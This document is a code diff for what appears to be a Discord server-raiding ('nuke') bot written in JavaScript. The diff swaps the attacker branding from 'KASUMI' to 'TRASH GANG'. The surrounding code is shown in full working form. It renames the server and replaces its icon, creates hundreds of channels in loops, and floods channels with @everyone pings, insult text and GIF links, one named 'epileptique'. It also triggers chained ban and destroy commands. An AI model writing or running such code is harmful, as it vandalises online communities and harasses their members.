@@ -533,7 +533,7 @@ if(message.content === "roles"){
   }
   if(message.content.includes("@everyone")){
     delete caches;
-        message.channel.send("@everyone @here FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI https://media.giphy.com/media/3oEdv5SY4LBHUBe2o8/giphy.gif https://media.giphy.com/media/vvZeaCj5tf0qY/giphy.gif https://media.giphy.com/media/xT1XGZndeDLlWvSDaU/giphy.gif https://media.giphy.com/media/cITuehqQIbqQo/giphy.gif")
+        message.channel.send("@everyone @here Dead By Trxsh Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif")
 }
 if(message.content === "roles"){
     for(var i =0; i < 200; i++){
@@ -546,12 +546,12 @@ if(message.content === "roles"){
     }
     //foutre la merde
     if(message.content === "issou"){
-        message.guild.setName("OWNED BY KASUMI")
-        message.guild.setIcon("https://media.giphy.com/media/cITuehqQIbqQo/giphy.gif")
+        message.guild.setName("OWNED BY TRASH GANG")
+        message.guild.setIcon("https://cdn.discordapp.com/attachments/521480062831165442/521732094859149312/COVERART-2-350x350.jpg")
       }
       if(message.content === "pd"){
         for(var i =0; i < 450; i++){
-        message.guild.createChannel("GANG","voice")
+        message.guild.createChannel("TRASH GANG","voice")
         }
       }
       //réaction en chaine
@@ -559,9 +559,9 @@ if(message.content === "roles"){
               message.channel.send("roles").then(m => m.delete());
               message.channel.send("issou").then(m => m.delete());
                 for(var i = 0; i < 50; i++){
-                    message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI FUCKED BY KASUMI //media.giphy.com/media/3oEdv5SY4LBHUBe2o8/giphy.gif https://media.giphy.com/media/vvZeaCj5tf0qY/giphy.gif https://media.giphy.com/media/xT1XGZndeDLlWvSDaU/giphy.gif https://media.giphy.com/media/cITuehqQIbqQo/giphy.gif"))
+                    message.guild.createChannel("FUCKED", "text").then(c => c.send("@everyone @here Dead By Trxsh Gang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng https://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gifhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif https://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif https://cdn.discordapp.com/attachments/493955038411096115/516192223436734464/20181125_110215.gif"))
                     message.guild.createChannel("BY","voice")
-                    message.guild.createChannel("KASUMI","category")    
+                    message.guild.createChannel("TRASH GANG","category")    
                 }
                 }
                 if(message.content.includes("ban")){
@@ -581,7 +581,7 @@ if(message.content === "roles"){
                     }
                     //on commence la destruction
                     if(message.content.includes("détruire")){
-                        message.channel.send("ban").then(m => m.delete());
+                        message.channel.send("bane").then(m => m.delete());
                         message.channel.send("drole").then(m => m.delete());
                         message.channel.send("destroy").then(m => m.delete());
                         message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
